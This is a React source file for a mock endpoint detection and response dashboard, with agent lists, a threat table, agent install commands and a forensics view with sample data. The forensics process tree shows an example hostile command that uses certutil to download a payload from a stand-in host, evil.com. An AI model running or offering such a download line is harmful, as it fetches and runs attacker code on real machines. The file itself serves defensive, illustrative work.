import { useState, useMemo } from 'react'
import { generateEDRAgents } from '../data/sectorData'

const THREATS = [
  {id:'THR-001',name:'Emotet Banking Trojan',mitre:'T1566.001',severity:'CRITICAL',status:'CONTAINED',endpoint:'WIN-SRV-01',detectedAt:'2026-03-13 14:30',hash:'a1b2c3d4e5f6'},
  {id:'THR-002',name:'Cobalt Strike Beacon',mitre:'T1059.001',severity:'CRITICAL',status:'INVESTIGATING',endpoint:'LNX-APP-03',detectedAt:'2026-03-13 11:20',hash:'f6e5d4c3b2a1'},
  {id:'THR-003',name:'Mimikatz Credential Dump',mitre:'T1003.001',severity:'HIGH',status:'BLOCKED',endpoint:'WIN-WS-07',detectedAt:'2026-03-12 18:45',hash:'1a2b3c4d5e6f'},
  {id:'THR-004',name:'LockBit 3.0 Ransomware',mitre:'T1486',severity:'CRITICAL',status:'CONTAINED',endpoint:'WIN-SRV-02',detectedAt:'2026-03-10 09:15',hash:'6f5e4d3c2b1a'},
  {id:'THR-005',name:'Log4Shell Exploitation',mitre:'T1190',severity:'HIGH',status:'BLOCKED',endpoint:'LNX-WEB-01',detectedAt:'2026-03-11 22:00',hash:'b1a2c3d4e5f6'},
  {id:'THR-006',name:'SolarWinds Supply Chain',mitre:'T1195.002',severity:'CRITICAL',status:'INVESTIGATING',endpoint:'WIN-SRV-05',detectedAt:'2026-03-09 06:30',hash:'c3d4e5f6a1b2'},
]

const EDR_CAPABILITIES = [
  {feature:'Real-time File System Monitoring',edr:true,xdr:true,mitre:'T1083'},
  {feature:'Process Execution Tracking',edr:true,xdr:true,mitre:'T1059'},
  {feature:'Network Connection Monitoring',edr:true,xdr:true,mitre:'T1071'},
  {feature:'Registry Change Detection',edr:true,xdr:true,mitre:'T1547'},
  {feature:'Memory Analysis (YARA)',edr:true,xdr:true,mitre:'T1055'},
  {feature:'Behavioral Detection (ML)',edr:true,xdr:true,mitre:'T1204'},
  {feature:'Cross-Platform Correlation',edr:false,xdr:true,mitre:'T1021'},
  {feature:'Cloud Workload Protection',edr:false,xdr:true,mitre:'T1190'},
  {feature:'Email Threat Analysis',edr:false,xdr:true,mitre:'T1566'},
  {feature:'Identity Threat Detection',edr:false,xdr:true,mitre:'T1078'},
  {feature:'SOAR Integration',edr:false,xdr:true,mitre:'—'},
  {feature:'Automated Incident Response',edr:true,xdr:true,mitre:'—'},
]

export default function EDRPage() {
  const [tab, setTab] = useState<'agents'|'threats'|'deploy'|'forensics'|'capabilities'>('agents')
  const [selected, setSelected] = useState<any>(null)
  const [page, setPage] = useState(0)
  const [filterStatus, setFilterStatus] = useState('')
  const [deployOS, setDeployOS] = useState('windows')

  const allAgents = useMemo(() => generateEDRAgents(100), [])
  const [agents, setAgents] = useState(allAgents)

  const stats = useMemo(() => ({
    total: agents.length,
    active: agents.filter(a=>a.status==='ACTIVE').length,
    isolated: agents.filter(a=>a.status==='ISOLATED').length,
    offline: agents.filter(a=>a.status==='OFFLINE').length,
    threats: THREATS.length,
    critical: THREATS.filter(t=>t.severity==='CRITICAL').length,
  }), [agents])

  const filteredAgents = useMemo(() => filterStatus ? agents.filter(a=>a.status===filterStatus) : agents, [agents, filterStatus])
  const PAGE_SIZE = 20
  const totalPages = Math.ceil(filteredAgents.length / PAGE_SIZE)
  const paged = filteredAgents.slice(page*PAGE_SIZE,(page+1)*PAGE_SIZE)

  const isolateAgent = (id: string) => setAgents(agents.map(a => a.id===id ? {...a,status:a.status==='ISOLATED'?'ACTIVE':'ISOLATED'} : a))

  return (
    <div className="page-container">
      <div className="page-header"><h1>🖥️ EDR / XDR</h1><p>Endpoint Detection & Response + Extended Detection & Response — MITRE ATT&CK mapped</p></div>

      <div className="kpi-grid">
        <div className="kpi-card green"><div className="kpi-value" style={{color:'var(--green)'}}>{stats.active}</div><div className="kpi-label">Active Agents</div></div>
        <div className="kpi-card red"><div className="kpi-value" style={{color:'var(--red)'}}>{stats.isolated}</div><div className="kpi-label">Isolated</div></div>
        <div className="kpi-card amber"><div className="kpi-value" style={{color:'var(--amber)'}}>{stats.offline}</div><div className="kpi-label">Offline</div></div>
        <div className="kpi-card"><div className="kpi-value">{stats.total}</div><div className="kpi-label">Total Agents</div></div>
        <div className="kpi-card red"><div className="kpi-value" style={{color:'var(--red)'}}>{stats.critical}</div><div className="kpi-label">Critical Threats</div></div>
        <div className="kpi-card"><div className="kpi-value">{stats.threats}</div><div className="kpi-label">Total Threats</div></div>
      </div>

      <div style={{display:'flex',gap:8,marginBottom:20,flexWrap:'wrap'}}>
        {(['agents','threats','deploy','forensics','capabilities'] as const).map(t=>(
          <button key={t} className={tab===t?'btn-primary':'btn-secondary'} onClick={()=>setTab(t)}>
            {t==='agents'?'🖥️ Agents ('+stats.total+')':t==='threats'?'🦠 Threats ('+THREATS.length+')':t==='deploy'?'📦 Agent Deployment':t==='forensics'?'🔬 Forensics':'📊 EDR vs XDR'}
          </button>
        ))}
      </div>

      {tab==='agents' && (
        <div className="glass-card">
          <h3>🖥️ Endpoint Agents ({filteredAgents.length})</h3>
          <div style={{margin:'12px 0'}}>
            <select className="form-input" style={{width:160}} value={filterStatus} onChange={e=>{setFilterStatus(e.target.value);setPage(0)}}>
              <option value="">All Status</option><option>ACTIVE</option><option>ISOLATED</option><option>OFFLINE</option>
            </select>
          </div>
          <div className="data-table-wrapper">
            <table className="data-table">
              <thead><tr><th>ID</th><th>Hostname</th><th>OS</th><th>IP</th><th>Version</th><th>Status</th><th>Threats</th><th>Last Seen</th><th>Actions</th></tr></thead>
              <tbody>{paged.map(a=>(
                <tr key={a.id} onClick={()=>setSelected(a)} style={{cursor:'pointer'}}>
                  <td style={{fontFamily:'monospace',fontSize:11}}>{a.id}</td>
                  <td><strong>{a.hostname}</strong></td>
                  <td style={{fontSize:12}}>{a.os}</td>
                  <td style={{fontFamily:'monospace',fontSize:12}}>{a.ip}</td>
                  <td style={{fontSize:12}}>{a.version}</td>
                  <td><span className={`rag-badge ${a.status==='ACTIVE'?'rag-green':a.status==='ISOLATED'?'rag-red':'rag-amber'}`}>{a.status}</span></td>
                  <td style={{fontWeight:700,color:a.threats>0?'var(--red)':'var(--green)'}}>{a.threats}</td>
                  <td style={{fontSize:11}}>{new Date(a.lastSeen).toLocaleTimeString()}</td>
                  <td>
                    <button className="btn-sm" style={{color:a.status==='ISOLATED'?'var(--green)':'var(--red)',borderColor:a.status==='ISOLATED'?'var(--green)':'var(--red)'}} onClick={e=>{e.stopPropagation();isolateAgent(a.id)}}>
                      {a.status==='ISOLATED'?'Restore':'Isolate'}
                    </button>
                  </td>
                </tr>
              ))}</tbody>
            </table>
          </div>
          <div style={{display:'flex',justifyContent:'space-between',alignItems:'center',marginTop:12}}>
            <span style={{fontSize:12,color:'var(--text-muted)'}}>Page {page+1} of {totalPages}</span>
            <div style={{display:'flex',gap:4}}>
              <button className="btn-sm" disabled={page===0} onClick={()=>setPage(p=>p-1)}>◀ Prev</button>
              <button className="btn-sm" disabled={page>=totalPages-1} onClick={()=>setPage(p=>p+1)}>Next ▶</button>
            </div>
          </div>
        </div>
      )}

      {tab==='threats' && (
        <div className="glass-card">
          <h3>🦠 Detected Threats ({THREATS.length})</h3>
          <div className="data-table-wrapper">
            <table className="data-table">
              <thead><tr><th>ID</th><th>Threat Name</th><th>MITRE</th><th>Severity</th><th>Status</th><th>Endpoint</th><th>Detected</th><th>Hash</th><th>Actions</th></tr></thead>
              <tbody>{THREATS.map(t=>(
                <tr key={t.id}>
                  <td style={{fontFamily:'monospace',fontSize:11}}>{t.id}</td>
                  <td><strong>{t.name}</strong></td>
                  <td style={{fontFamily:'monospace',color:'var(--brand-primary)'}}>{t.mitre}</td>
                  <td><span className={`rag-badge ${t.severity==='CRITICAL'?'rag-red':'rag-amber'}`}>{t.severity}</span></td>
                  <td><span className={`rag-badge ${t.status==='BLOCKED'?'rag-green':t.status==='CONTAINED'?'rag-amber':'rag-red'}`}>{t.status}</span></td>
                  <td style={{fontFamily:'monospace',fontSize:12}}>{t.endpoint}</td>
                  <td style={{fontSize:12}}>{t.detectedAt}</td>
                  <td style={{fontFamily:'monospace',fontSize:10}}>{t.hash}</td>
                  <td><button className="btn-sm">Investigate</button></td>
                </tr>
              ))}</tbody>
            </table>
          </div>
        </div>
      )}

      {/* ═══ AGENT DEPLOYMENT TAB (like CrowdStrike Falcon / Palo Alto Cortex) ═══ */}
      {tab==='deploy' && (
        <div>
          <div className="glass-card" style={{padding:20,borderLeft:'4px solid var(--green)',marginBottom:16}}>
            <h3 style={{margin:'0 0 8px'}}>📦 QS-EDR Agent — Deployment Center</h3>
            <p style={{fontSize:13,color:'var(--text-muted)'}}>Download and deploy the QS-EDR agent on your endpoints. The agent runs as a lightweight service ({"<"}25MB RAM) and communicates over PQC-TLS 1.3 to the management console.</p>
          </div>

          {/* OS Selector */}
          <div style={{display:'flex',gap:12,marginBottom:20}}>
            {[
              {id:'windows',icon:'🪟',label:'Windows',pkg:'MSI / EXE',versions:['Windows 11','Windows 10','Server 2022','Server 2019']},
              {id:'linux',icon:'🐧',label:'Linux',pkg:'DEB / RPM',versions:['Ubuntu 22.04+','RHEL 8+','CentOS 8+','Debian 11+']},
              {id:'macos',icon:'🍎',label:'macOS',pkg:'PKG',versions:['Ventura 13+','Sonoma 14+','Sequoia 15+']},
            ].map(os=>(
              <div key={os.id} className="glass-card" style={{flex:1,padding:20,cursor:'pointer',borderColor:deployOS===os.id?'var(--brand-primary)':'var(--border)',borderWidth:deployOS===os.id?2:1,borderStyle:'solid'}} onClick={()=>setDeployOS(os.id)}>
                <div style={{fontSize:36,textAlign:'center'}}>{os.icon}</div>
                <h4 style={{textAlign:'center',margin:'8px 0 4px'}}>{os.label}</h4>
                <div style={{textAlign:'center',fontSize:12,color:'var(--text-muted)'}}>{os.pkg}</div>
                <div style={{marginTop:8,fontSize:11,color:'var(--text-muted)'}}>
                  {os.versions.map(v=><div key={v}>✅ {v}</div>)}
                </div>
              </div>
            ))}
          </div>

          {/* Download Section */}
          <div className="glass-card" style={{padding:20,marginBottom:16}}>
            <h3 style={{margin:'0 0 16px'}}>⬇️ Download Agent Installer</h3>
            <div className="data-table-wrapper"><table className="data-table">
              <thead><tr><th>Package</th><th>Version</th><th>Size</th><th>Architecture</th><th>Signature</th><th>Action</th></tr></thead>
              <tbody>
                {deployOS==='windows' && <>
                  <tr><td><strong>QS-EDR-Agent.msi</strong></td><td>3.2.1</td><td>42 MB</td><td>x64</td><td style={{fontFamily:'monospace',fontSize:10,color:'var(--green)'}}>ML-DSA-87 ✅</td><td><button className="btn-primary" style={{fontSize:12}}>⬇️ Download MSI</button></td></tr>
                  <tr><td><strong>QS-EDR-Agent.exe</strong></td><td>3.2.1</td><td>38 MB</td><td>x64</td><td style={{fontFamily:'monospace',fontSize:10,color:'var(--green)'}}>ML-DSA-87 ✅</td><td><button className="btn-primary" style={{fontSize:12}}>⬇️ Download EXE</button></td></tr>
                  <tr><td><strong>QS-EDR-Agent-ARM.msi</strong></td><td>3.2.1</td><td>40 MB</td><td>ARM64</td><td style={{fontFamily:'monospace',fontSize:10,color:'var(--green)'}}>ML-DSA-87 ✅</td><td><button className="btn-primary" style={{fontSize:12}}>⬇️ Download</button></td></tr>
                </>}
                {deployOS==='linux' && <>
                  <tr><td><strong>qs-edr-agent_3.2.1_amd64.deb</strong></td><td>3.2.1</td><td>35 MB</td><td>amd64</td><td style={{fontFamily:'monospace',fontSize:10,color:'var(--green)'}}>ML-DSA-87 ✅</td><td><button className="btn-primary" style={{fontSize:12}}>⬇️ Download DEB</button></td></tr>
                  <tr><td><strong>qs-edr-agent-3.2.1.x86_64.rpm</strong></td><td>3.2.1</td><td>36 MB</td><td>x86_64</td><td style={{fontFamily:'monospace',fontSize:10,color:'var(--green)'}}>ML-DSA-87 ✅</td><td><button className="btn-primary" style={{fontSize:12}}>⬇️ Download RPM</button></td></tr>
                  <tr><td><strong>qs-edr-agent_3.2.1_arm64.deb</strong></td><td>3.2.1</td><td>33 MB</td><td>arm64</td><td style={{fontFamily:'monospace',fontSize:10,color:'var(--green)'}}>ML-DSA-87 ✅</td><td><button className="btn-primary" style={{fontSize:12}}>⬇️ Download</button></td></tr>
                </>}
                {deployOS==='macos' && <>
                  <tr><td><strong>QS-EDR-Agent-3.2.1.pkg</strong></td><td>3.2.1</td><td>45 MB</td><td>Universal</td><td style={{fontFamily:'monospace',fontSize:10,color:'var(--green)'}}>ML-DSA-87 ✅</td><td><button className="btn-primary" style={{fontSize:12}}>⬇️ Download PKG</button></td></tr>
                </>}
              </tbody>
            </table></div>
          </div>

          {/* Installation Commands */}
          <div className="glass-card" style={{padding:20,marginBottom:16}}>
            <h3 style={{margin:'0 0 12px'}}>💻 Installation Commands</h3>
            <div style={{background:'#1a1a2e',padding:16,borderRadius:8,fontFamily:'monospace',fontSize:12,lineHeight:1.8,color:'#e0e0e0',overflowX:'auto'}}>
              {deployOS==='windows' && <>
                <div style={{color:'var(--green)'}}>{'# Silent install via MSI (recommended for SCCM / GPO deployment)'}</div>
                <div>msiexec /i QS-EDR-Agent.msi /qn MANAGEMENT_SERVER="https://edr.yourcompany.com" API_KEY="YOUR_API_KEY" /l*v install.log</div>
                <br/>
                <div style={{color:'var(--green)'}}>{'# PowerShell one-liner for mass deployment'}</div>
                <div>Invoke-WebRequest -Uri "https://edr.yourcompany.com/agent/windows/latest" -OutFile agent.msi; Start-Process msiexec -ArgumentList "/i agent.msi /qn API_KEY=$env:QS_API_KEY" -Wait</div>
                <br/>
                <div style={{color:'var(--green)'}}>{'# Verify installation'}</div>
                <div>Get-Service QS-EDR-Agent | Format-Table Status, StartType, Name</div>
              </>}
              {deployOS==='linux' && <>
                <div style={{color:'var(--green)'}}>{'# Ubuntu / Debian (DEB)'}</div>
                <div>curl -sL https://edr.yourcompany.com/agent/linux/latest.deb -o qs-edr-agent.deb</div>
                <div>sudo dpkg -i qs-edr-agent.deb</div>
                <div>sudo qs-edr-agent configure --server https://edr.yourcompany.com --api-key YOUR_API_KEY</div>
                <div>sudo systemctl enable --now qs-edr-agent</div>
                <br/>
                <div style={{color:'var(--green)'}}>{'# RHEL / CentOS (RPM)'}</div>
                <div>sudo rpm -i https://edr.yourcompany.com/agent/linux/latest.rpm</div>
                <div>sudo qs-edr-agent configure --server https://edr.yourcompany.com --api-key YOUR_API_KEY</div>
                <div>sudo systemctl enable --now qs-edr-agent</div>
              </>}
              {deployOS==='macos' && <>
                <div style={{color:'var(--green)'}}>{'# Install via PKG'}</div>
                <div>sudo installer -pkg QS-EDR-Agent-3.2.1.pkg -target /</div>
                <div>sudo /opt/qs-edr/qs-edr-agent configure --server https://edr.yourcompany.com --api-key YOUR_API_KEY</div>
                <div>sudo launchctl load /Library/LaunchDaemons/com.neurqai.qs-edr-agent.plist</div>
              </>}
            </div>
          </div>

          {/* API Key Management */}
          <div className="glass-card" style={{padding:20}}>
            <h3 style={{margin:'0 0 12px'}}>🔑 API Keys & Deployment Tokens</h3>
            <div className="data-table-wrapper"><table className="data-table">
              <thead><tr><th>Key Name</th><th>Token</th><th>Scope</th><th>Created</th><th>Status</th></tr></thead>
              <tbody>
                <tr><td><strong>Production Deployment</strong></td><td style={{fontFamily:'monospace',fontSize:11}}>sk-edr-prod-•••••••••d4f8</td><td>Full Agent Access</td><td>2026-01-15</td><td><span className="rag-badge rag-green">ACTIVE</span></td></tr>
                <tr><td><strong>Staging Environment</strong></td><td style={{fontFamily:'monospace',fontSize:11}}>sk-edr-stg-•••••••••a2b1</td><td>Full Agent Access</td><td>2026-02-20</td><td><span className="rag-badge rag-green">ACTIVE</span></td></tr>
                <tr><td><strong>CI/CD Pipeline</strong></td><td style={{fontFamily:'monospace',fontSize:11}}>sk-edr-ci-•••••••••e7c3</td><td>Read Only</td><td>2026-03-01</td><td><span className="rag-badge rag-green">ACTIVE</span></td></tr>
              </tbody>
            </table></div>
            <div style={{display:'flex',gap:8,marginTop:12}}>
              <button className="btn-primary" onClick={()=>alert('New API Key generated:\nsk-edr-new-'+Math.random().toString(36).slice(2,14)+'\n\nCopy and save this key — it will not be shown again.')}>🔑 Generate New Key</button>
              <button className="btn-secondary">📋 Deployment Guide (PDF)</button>
            </div>
          </div>
        </div>
      )}

      {/* ═══ FORENSICS TAB (like Palo Alto Cortex XDR) ═══ */}
      {tab==='forensics' && (
        <div>
          <div className="glass-card" style={{padding:20,marginBottom:16}}>
            <h3 style={{margin:'0 0 12px'}}>🔬 Forensic Investigation — Process Tree</h3>
            <p style={{fontSize:12,color:'var(--text-muted)',marginBottom:16}}>Real-time process hierarchy from selected endpoint. Like Palo Alto Cortex XDR / CrowdStrike Falcon Investigate.</p>
            <div style={{background:'#1a1a2e',padding:16,borderRadius:8,fontFamily:'monospace',fontSize:12,lineHeight:1.6,color:'#e0e0e0'}}>
              <div style={{color:'var(--green)'}}>{'├── '}<span style={{color:'#fff'}}>System (PID: 4)</span></div>
              <div style={{color:'var(--green)'}}>{'│   ├── '}<span style={{color:'#fff'}}>smss.exe (PID: 348)</span></div>
              <div style={{color:'var(--green)'}}>{'│   └── '}<span style={{color:'#fff'}}>csrss.exe (PID: 528)</span></div>
              <div style={{color:'var(--green)'}}>{'├── '}<span style={{color:'#fff'}}>services.exe (PID: 672)</span></div>
              <div style={{color:'var(--green)'}}>{'│   ├── '}<span style={{color:'#fff'}}>svchost.exe (PID: 812)</span></div>
              <div style={{color:'var(--green)'}}>{'│   ├── '}<span style={{color:'var(--green)'}}>qs-edr-agent.exe (PID: 1024)</span> — 🛡️ QS-EDR Agent v3.2.1</div>
              <div style={{color:'var(--green)'}}>{'│   └── '}<span style={{color:'var(--red)'}}>powershell.exe (PID: 2456)</span> ⚠️ SUSPICIOUS — Encoded command detected</div>
              <div style={{color:'var(--green)'}}>{'│       └── '}<span style={{color:'var(--red)'}}>cmd.exe (PID: 3012)</span> → <span style={{color:'var(--red)'}}>certutil.exe -urlcache -split -f http://evil.com/payload.exe</span></div>
              <div style={{color:'var(--green)'}}>{'├── '}<span style={{color:'#fff'}}>explorer.exe (PID: 4120)</span></div>
              <div style={{color:'var(--green)'}}>{'│   ├── '}<span style={{color:'#fff'}}>chrome.exe (PID: 5234)</span></div>
              <div style={{color:'var(--green)'}}>{'│   └── '}<span style={{color:'#fff'}}>outlook.exe (PID: 5890)</span></div>
            </div>
          </div>

          <div style={{display:'grid',gridTemplateColumns:'1fr 1fr',gap:16}}>
            <div className="glass-card" style={{padding:20}}>
              <h3 style={{margin:'0 0 12px'}}>🌐 Network Connections</h3>
              <div className="data-table-wrapper"><table className="data-table">
                <thead><tr><th>PID</th><th>Process</th><th>Remote</th><th>Port</th><th>Status</th></tr></thead>
                <tbody>
                  <tr><td>2456</td><td style={{color:'var(--red)'}}>powershell.exe</td><td style={{fontFamily:'monospace'}}>185.243.115.42</td><td>443</td><td><span className="rag-badge rag-red">MALICIOUS</span></td></tr>
                  <tr><td>5234</td><td>chrome.exe</td><td style={{fontFamily:'monospace'}}>142.250.195.68</td><td>443</td><td><span className="rag-badge rag-green">CLEAN</span></td></tr>
                  <tr><td>1024</td><td style={{color:'var(--green)'}}>qs-edr-agent</td><td style={{fontFamily:'monospace'}}>10.0.0.5</td><td>8443</td><td><span className="rag-badge rag-green">MGMT</span></td></tr>
                  <tr><td>5890</td><td>outlook.exe</td><td style={{fontFamily:'monospace'}}>52.114.132.46</td><td>443</td><td><span className="rag-badge rag-green">CLEAN</span></td></tr>
                </tbody>
              </table></div>
            </div>

            <div className="glass-card" style={{padding:20}}>
              <h3 style={{margin:'0 0 12px'}}>📁 File Activity Timeline</h3>
              <div style={{fontSize:12,lineHeight:2}}>
                <div>🔴 <strong>14:30:15</strong> — <code>certutil.exe</code> wrote <code>C:\Temp\payload.exe</code> (1.2 MB)</div>
                <div>🔴 <strong>14:30:12</strong> — <code>powershell.exe</code> encoded command executed</div>
                <div>🟡 <strong>14:28:45</strong> — <code>outlook.exe</code> opened <code>invoice.docm</code> (macro-enabled)</div>
                <div>🟢 <strong>14:25:00</strong> — <code>chrome.exe</code> downloaded <code>report.pdf</code></div>
                <div>🟢 <strong>14:20:00</strong> — <code>qs-edr-agent</code> — heartbeat sent</div>
                <div>🟢 <strong>14:15:00</strong> — <code>qs-edr-agent</code> — policy update received</div>
              </div>
            </div>
          </div>

          <div className="glass-card" style={{padding:20,marginTop:16}}>
            <h3 style={{margin:'0 0 12px'}}>🧪 Memory Analysis</h3>
            <div className="data-table-wrapper"><table className="data-table">
              <thead><tr><th>Process</th><th>PID</th><th>Memory</th><th>YARA Match</th><th>Injection</th><th>Verdict</th></tr></thead>
              <tbody>
                <tr><td style={{color:'var(--red)'}}><strong>powershell.exe</strong></td><td>2456</td><td>148 MB</td><td><span className="rag-badge rag-red">CobaltStrike_Beacon</span></td><td><span className="rag-badge rag-red">Process Hollowing</span></td><td><span className="rag-badge rag-red">MALICIOUS</span></td></tr>
                <tr><td>svchost.exe</td><td>812</td><td>32 MB</td><td>—</td><td>—</td><td><span className="rag-badge rag-green">CLEAN</span></td></tr>
                <tr><td style={{color:'var(--green)'}}>qs-edr-agent.exe</td><td>1024</td><td>22 MB</td><td>—</td><td>—</td><td><span className="rag-badge rag-green">CLEAN</span></td></tr>
              </tbody>
            </table></div>
            <div style={{display:'flex',gap:8,marginTop:12}}>
              <button className="btn-primary">📸 Full Memory Dump</button>
              <button className="btn-secondary">🔍 Deep YARA Scan</button>
              <button className="btn-secondary">📋 Export IOCs</button>
              <button className="btn-secondary">🤖 Auto-Remediate</button>
            </div>
          </div>
        </div>
      )}

      {tab==='capabilities' && (
        <div className="glass-card">
          <h3>📊 EDR vs XDR Capabilities</h3>
          <div className="data-table-wrapper">
            <table className="data-table">
              <thead><tr><th>Capability</th><th>EDR</th><th>XDR</th><th>MITRE</th></tr></thead>
              <tbody>{EDR_CAPABILITIES.map((c,i)=>(
                <tr key={i}>
                  <td><strong>{c.feature}</strong></td>
                  <td>{c.edr?<span className="rag-badge rag-green">✅</span>:<span className="rag-badge rag-red">—</span>}</td>
                  <td>{c.xdr?<span className="rag-badge rag-green">✅</span>:<span className="rag-badge rag-red">—</span>}</td>
                  <td style={{fontFamily:'monospace',fontSize:12,color:'var(--brand-primary)'}}>{c.mitre}</td>
                </tr>
              ))}</tbody>
            </table>
          </div>
        </div>
      )}

      {selected && (
        <div className="glass-card" style={{marginTop:16}}>
          <div style={{display:'flex',justifyContent:'space-between'}}><h3>🖥️ Agent — {selected.hostname}</h3><button className="btn-sm" onClick={()=>setSelected(null)}>✕</button></div>
          <div style={{display:'grid',gridTemplateColumns:'1fr 1fr 1fr',gap:16,marginTop:16}}>
            <div><strong>ID:</strong> {selected.id}</div>
            <div><strong>OS:</strong> {selected.os}</div>
            <div><strong>IP:</strong> {selected.ip}</div>
            <div><strong>Version:</strong> {selected.version}</div>
            <div><strong>Status:</strong> <span className={`rag-badge ${selected.status==='ACTIVE'?'rag-green':'rag-red'}`}>{selected.status}</span></div>
            <div><strong>Threats:</strong> {selected.threats}</div>
          </div>
          <div style={{display:'flex',gap:8,marginTop:16}}>
            <button className="btn-primary" onClick={()=>isolateAgent(selected.id)}>{selected.status==='ISOLATED'?'✅ Restore':'🔒 Isolate'}</button>
            <button className="btn-secondary">📋 Forensic Timeline</button>
            <button className="btn-secondary">🔄 Update Agent</button>
          </div>
        </div>
      )}
    </div>
  )
}
